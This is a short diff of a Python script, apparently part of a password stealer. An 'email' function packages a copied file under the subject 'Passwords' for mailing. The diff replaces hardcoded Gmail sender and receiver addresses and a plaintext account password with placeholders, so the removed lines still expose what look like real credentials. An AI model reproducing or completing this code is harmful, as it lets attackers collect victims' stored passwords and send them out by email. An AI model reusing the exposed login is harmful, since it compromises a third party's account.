@@ -30,9 +30,9 @@ def copy():
 
 def email(copy_file):
     
-    sender = 'hackorhutiya@gmail.com'
-    reciever = 'duttaprabhjit6@gmail.com'
-    password1 = 'hackorhutiyaprabhjit'
+    sender = 'Sender Email ID'
+    reciever = 'Reciever Email ID'
+    password1 = 'password'
     subject = 'Passwords'
     mail = EmailMessage()
     message = ''
